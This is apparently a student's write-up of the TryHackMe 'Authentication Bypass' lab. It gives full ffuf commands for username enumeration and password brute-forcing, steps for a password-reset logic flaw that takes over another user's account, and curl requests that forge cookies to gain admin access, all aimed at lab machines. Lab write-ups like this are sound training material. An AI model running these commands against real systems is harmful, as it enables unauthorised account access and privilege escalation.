# 🔓 Authentication Bypass

## 📝 Introduction

In this room, **Authentication Bypass**, we aim to understand how to identify and exploit vulnerabilities that allow attackers to bypass authentication mechanisms. These vulnerabilities can lead to unauthorised access, data leaks, and full system compromise. 
Understanding these techniques is crucial for both offensive security testing and defensive hardening.

## ⚙️ Process

### 1. **Username Enumeration**
will try to create a valid usernames list for the targeted website through the sign-up page, to find all usernames logged into it previously.
To conduct this attack, we will use ffuf, which is a enumeration tool that can be downloaded from https://github.com/ffuf/ffuf.
Create a text file that stores the outputs.

from my terminal:

ffuf -w /home/kali/names.txt \
     -u http://10.10.x.x/customers/signup \
     -X POST \
     -d "username=FUZZ&email=x&password=x&cpassword=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -mr "username already exists" \
    	-o valid.txt

Note: correct order for the flags is =>  
				
					-w -> -u -> -X -> -d -> other flags

-w word list

-u target

-X post HTTP method

-d data

-H Header

-mr match response

-o output file



<img width="1072" height="620" alt="ffuf" src="https://github.com/user-attachments/assets/71de6c3d-75d8-4f0d-b441-0b9fbf7a0a0d" />


### 1. **Brute Force**

Using the ffuf command again, we can conduct a brute force attack on the login page. It is an automated process that tries a list of commonly used passwords (10-million-password-list-top-100.txt) against either a single username or, like in our case, a list of usernames(valid.txt).

From kali, I opened a terminal:

ffuf -w valid.txt:W1,/home/kali/10-million-password-list-top-100.txt:W2\
 -X POST\
 -d "username=W1&password=W2"\
 -H "Content-Type: application/x-www-form-urlencoded"\
 -u http://10.10.77.223/customers/login\
 -fc 200

We used the -fc argument to check for an HTTP status code other than 200.

 Note:		
		 HTTP status code or Response status: 200,204,301,302,307,401,403,405,500

 that we can choose from to find the server responds to a successful and failed attempts. 
 
 In our case, for a positive match, we're using the -fc argument to check for an HTTP status code other than 200.

 

<img width="741" height="621" alt="Brute_force_ffuf" src="https://github.com/user-attachments/assets/07c7ff2e-500e-48b7-95be-931c9fb8cd97" />



### 3. **Logic Flow**

A logic flaw occurs when the normal logical flow of an application is bypassed, circumvented, or manipulated by a hacker. It means there's a vulnerability that allows an attacker to do something they shouldn't be able to do because of a mistake or oversight in the application's logic.



  1-  Create an account on the Acme IT Support customer section. (أنشئ حسابًا على قسم العملاء الخاص بشركة Acme IT Support)  
        When you create this account, you'll receive a unique email address in the format of:
        {username}@customer.acmeitsupport.thm
        For example: yourname@customer.acmeitsupport.thm

 2-   Use your new email address to trigger the vulnerability: (استخدم عنوان البريد الإلكتروني الخاص بك لتفعيل الثغرة)  
        You'll rerun Curl Request 2, but this time, you'll put your own email address (like yourname@customer.acmeitsupport.thm) in the email field.

    What happens then?
      1-   The system creates a support ticket linked to your email address.
        The system generates a login link for the account Robert (the original account used in the challenge), and sends it to your email (which you specified).

    2-  Using the login link, you can log in as Robert (باستخدام الرابط، يمكنك تسجيل الدخول ك Robert)  
        Once logged in as Robert, you can view support tickets and find the flag.

		


<img width="885" height="496" alt="logic flaw" src="https://github.com/user-attachments/assets/59a3b8cd-967f-4865-ad28-99c71b798f84" />




### 3. **Cookie Tampering**


What you can get from examining and editing the cookies :


	1- Unauthenticated access
	
	2- Access to another user account
	
	3- elevated privileges

	and more:
	
    4- Session Hijacking: Stealing or manipulating session cookies to take over an active user session.
    5- Bypassing Security Controls: Modifying cookies to bypass authentication mechanisms or security checks.
    6- Data Leakage: Accessing or extracting sensitive information stored in cookies, such as personal data or tokens.
    7- Persistent Attacks: Creating or modifying cookies to maintain persistent access or backdoors.
    8- Tracking and Profiling: Altering cookies to manipulate user tracking or profiling mechanisms.
    9- Cross-Site Scripting (XSS) Exploits: Using manipulated cookies to facilitate or exploit XSS vulnerabilities.
    10- Manipulating User Preferences or State: Changing cookies to influence user experience or application behaviour maliciously.

After examining the cookie, we can do the following:


	@@ Get Unauthenticated access:		
		

		curl http://MACHINE_IP/cookie-test

		The result shows I am not logged to the machine


		curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test

		I am logged in as a user


	@@ elevated privileges to admin

		
		curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
		
		I am logged in as Admin ^-* 🎯




		
**Hashing

Seems to be a random string of characters
	MD5,	sha-256,	sha-512,	sha1

hash is irreversible; however, we can use services where they keep databases of billions of hashes and their original strings, like:

		Crackstation =>https://crackstation.net/
		Hashes.com
		OnlineHashCrack


**Encoding

Seems to be a random string of characters

For this task, I used 
			CyberChef => https://cyberchef.io/



## 🛠️ Tools Used

ffuf

curl

Cyberchef

CrackStation



## 🎯 My TryHackMe Achievement


I completed the "Authentication Bypass" room on TryHackMe.




<img width="1445" height="706" alt="Auth2" src="https://github.com/user-attachments/assets/01728d10-09a7-4788-9677-83b7f9aa6d65" />



---

*Remember: Always perform testing ethically and with permission!*



